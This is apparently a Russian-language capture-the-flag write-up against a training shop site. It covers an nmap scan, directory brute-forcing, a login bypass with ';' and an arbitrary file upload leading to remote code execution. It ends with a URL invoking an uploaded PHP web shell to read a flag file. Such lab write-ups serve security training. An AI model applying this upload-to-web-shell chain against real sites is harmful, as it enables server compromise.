---
attack: file upload
---


#### nmap 
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-25 08:10 EDT
Nmap scan report for shop.edu.stf (10.124.1.238)
Host is up (0.019s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE   VERSION
22/tcp   open  ssh       OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
| ssh-hostkey: 
|   3072 e7:a7:68:5a:e0:55:db:96:7f:b9:aa:5e:30:72:bf:f8 (RSA)
|   256 1d:75:9d:23:c6:58:40:c1:7d:ec:0f:7b:ff:6f:66:34 (ECDSA)
|_  256 df:54:3c:65:6f:e8:f8:ce:e0:fd:17:87:89:c1:fd:85 (ED25519)
80/tcp   open  http      Apache httpd 2.4.56 ((Debian))
|_http-title: BCORE Admin Dashboard Template | Login Page
|_http-server-header: Apache/2.4.56 (Debian)
1720/tcp open  h323q931?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kerne
```

 
 
#### directory
Директория "Выполнять" думаю будет нам полезна 
```
500      GET        0l        0w        0c http://10.124.1.238/Execute/ExActivateAgent.php
500      GET        0l        0w        0c http://10.124.1.238/Execute/ExEditCustomer.php
500      GET        0l        0w        0c http://10.124.1.238/Execute/ExDesActivateAgent.php
200      GET        1l        1w       45c http://10.124.1.238/Execute/ExLock.php
200      GET        2l        1w       49c http://10.124.1.238/Execute/ExDestroySession.php
200      GET        6l       10w       90c http://10.124.1.238/Execute/ExAddProduct.php
200      GET        6l        5w      120c http://10.124.1.238/Execute/ExAddBranche.php
200      GET        4l        0w        8c http://10.124.1.238/Execute/ExDelPur.php
200      GET        1l        8w      135c http://10.124.1.238/Execute/ExAgentLogin.php
200      GET        4l        2w       63c http://10.124.1.238/Execute/ExLogin2.php
200      GET        1l        8w      122c http://10.124.1.238/Execute/ExAgent.php
200      GET      932l     2301w    22879c http://10.124.1.238/Execute/dist/sweetalert.css
200      GET        6l       10w       95c http://10.124.1.238/Execute/ExPurchasing.php
200      GET        6l        3w      109c http://10.124.1.238/Execute/ExChangePassword.php
200      GET        6l       10w       92c http://10.124.1.238/Execute/ExSaling.php
200      GET        6l        5w      119c http://10.124.1.238/Execute/ExAddNewUser.php

```

#### Разведка 
когда я пробовал зайти на сайт то после ввода данных я заметил что запрос превращается в `http://shop.edu.stf/index.html?`
как я понял это не рабочая форма отправки , поэтому я просто поменял ее на index.php и тем самым  нашёл рабочую, можете посмотреть исходники этой формы , и увидеть проверку логина и пароля. я просо указывал ; ; в этих двух полях чтобы зайти на сайт 

view-source:http://10.124.1.238/index.php


**Arbitrary file upload to RCE** — это более специфичная уязвимость, которая возникает, когда злоумышленник может загружать произвольные файлы, включая исполняемые скрипты, что может привести к удаленному выполнению кода на сервере.

находим http://shop.edu.stf/UserProfile.php?%20id=
и 
![[Pasted image 20240909222039.png]]
 
 Далее нужно поэксплуатировать данную уяз 
Сам эксплоит
![[Pasted image 20240913174527.png]]

Страница на которой будет уязвимость http://shop.edu.stf/UserProfile.php?%20id=

проверка что мы загрузили файл http://shop.edu.stf/assets/img/Profile_Uploaded/
вызов флага
http://shop.edu.stf/assets/img/Profile_Uploaded/rev2.php?rev=/home/rceflag